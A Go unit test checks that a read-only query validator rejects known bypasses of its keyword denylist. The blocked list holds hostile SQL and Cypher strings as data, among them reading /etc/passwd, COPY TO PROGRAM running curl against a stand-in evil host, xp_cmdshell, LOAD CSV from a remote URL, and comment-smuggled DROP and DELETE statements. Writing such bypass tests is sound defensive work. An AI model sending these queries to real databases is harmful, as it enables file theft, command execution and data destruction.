package structured

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

// FI-22: known bypasses of the keyword denylist.
func TestValidateReadOnly_Bypasses(t *testing.T) {
	blocked := []string{
		"MATCH (n) CALL apoc.create.node(['X'], {}) YIELD node RETURN node",
		"RETURN APOC.CREATE.NODE(['X'], {})",
		"LOAD CSV FROM 'http://evil/x' AS row RETURN row",
		"CALL dbms.security.listUsers()",
		"SELECT pg_read_file('/etc/passwd')",
		"COPY (SELECT 1) TO PROGRAM 'curl evil'",
		"SELECT * FROM t INTO OUTFILE '/tmp/x'",
		"EXEC xp_cmdshell 'dir'",
		"MATCH (n) FOREACH (x IN [1] | SET n.a = 1)",
		"SELECT 1;--\nDROP TABLE t",
		"SELECT 1/**/;DELETE/**/FROM t",
		"ATTACH DATABASE '/tmp/x' AS y",
	}
	for _, q := range blocked {
		assert.Error(t, validateReadOnly(q), q)
	}
	allowed := []string{
		"SELECT name, created_at FROM users WHERE id = 1",
		"MATCH (n:Person)-[:KNOWS]->(m) RETURN n.name, m.name LIMIT 5",
	}
	for _, q := range allowed {
		assert.NoError(t, validateReadOnly(q), q)
	}
}
